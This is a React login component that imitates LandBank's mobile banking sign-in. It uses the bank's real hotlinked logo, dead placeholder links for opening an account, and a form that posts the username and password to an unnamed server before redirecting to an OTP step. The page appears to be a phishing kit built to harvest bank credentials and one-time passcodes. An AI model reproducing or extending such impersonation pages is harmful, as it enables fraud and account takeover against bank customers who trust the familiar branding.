import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import axios from "axios";
import BASE_URL from "../components/urls";
import FormErrMsg from "../components/FormErrMsg";
import { User, Lock } from "lucide-react";

const schema = yup.object().shape({
  email: yup.string().required("Email is required"),
  password: yup.string().required("Password is required"),
});

const Login = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const togglePassword = () => setShowPassword(!showPassword);

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        localStorage.setItem("email", data.email);
        navigate("/otp");
      })
      .catch((error) => {
        console.error("Login error", error);
      })
      .finally(() => setLoading(false));
  };

  return (
    <div className="home-page min-h-screen  flex items-start justify-center pt-[7em] px-4">
      <div className="w-full max-w-sm text-white px-2 ">
        {/* Logo */}
        <div className="flex justify-center items-center flex-col mb-12">
          <img
            src="https://www.landbank.com/new_assets/landbank_logo_white.png"
            className="mb-2"
            alt="logo"
          />
          <h1 className="text-xl font-semibold">MOBILE BANKING</h1>
        </div>

        <form onSubmit={handleSubmit(submitForm)} className="space-y-4">
          {/* Email Field */}
          <div className="mb-[6em] space-y-5">
            {/* Email Field */}
            <div>
              <label htmlFor="email" className="text-sm text-white font-medium">
                UserName
              </label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                  <User size={20} />
                </span>
                <input
                  type="text"
                  placeholder="Username"
                  {...register("email")}
                  className="w-full pl-10 p-3 text-black bg-white border border-gray-300 rounded-lg focus:outline-none placeholder:text-gray-500"
                />
              </div>
              <FormErrMsg errors={errors} inputName="email" />
            </div>

            {/* Password Field */}
            <div className="relative">
              <label
                htmlFor="password"
                className="text-sm text-white font-medium"
              >
                Password
              </label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                  <Lock size={20} />
                </span>
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="password"
                  {...register("password")}
                  className="w-full pl-10 pr-10 p-3 text-black bg-white border border-gray-300 rounded-lg focus:outline-none placeholder:text-gray-500"
                />
                <span
                  onClick={togglePassword}
                  className="absolute top-1/2 right-3 -translate-y-1/2 text-gray-800 cursor-pointer"
                >
                  {showPassword ? (
                    <AiOutlineEyeInvisible className="text-xl" />
                  ) : (
                    <AiOutlineEye className="text-xl" />
                  )}
                </span>
              </div>
              <FormErrMsg errors={errors} inputName="password" />
            </div>
          </div>
          {/* Login Button */}
          <button
            type="submit"
            disabled={loading}
            className={`w-full py-3 rounded-md font-semibold text-white ${
              loading
                ? "bg-green-300 cursor-not-allowed"
                : "bg-green-600 hover:bg-green-700"
            }`}
          >
            {loading ? "Logging in..." : "Log in"}
          </button>
        </form>

        {/* Create Account */}
        <div className="mt-4 text-center">
          <p className="text-white">
            <a href="#" className="text-lg">
              Open an account
            </a>
          </p>
        </div>
        <div className="mt-4 text-center">
          <p className="text-white">
            <a href="#" className="text-lg">
              not yet enrolled?{" "}
              <span className="text-lg font-semibold">Sign up now! </span>
            </a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;
